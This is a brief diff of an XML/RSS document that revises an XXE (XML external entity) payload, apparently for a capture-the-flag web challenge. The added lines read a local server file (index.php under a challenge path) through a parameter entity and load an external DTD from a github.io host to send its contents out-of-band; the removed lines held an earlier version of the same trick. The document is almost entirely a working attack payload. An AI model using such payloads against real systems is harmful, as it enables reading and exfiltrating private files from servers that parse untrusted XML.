@@ -1,9 +1,8 @@
-<!DOCTYPE rss [
- <!ENTITY % file SYSTEM "file://...">
- <!ENTITY % start "<![CDATA[">
- <!ENTITY % end "]]>">
- <!ENTITY % dtd SYSTEM "https://joffreyal.github.io/join.dtd">
+<!DOCTYPE updateProfile [
+ <!ENTITY % file SYSTEM "file:///challenge/web-serveur/ch29/index.php">
+ <!ENTITY % dtd SYSTEM "https://joffreyal.github.io/send.dtd">
 %dtd;
+%send;
 ]>
 <rss
 	xmlns:atom="http://www.w3.org/2005/Atom"
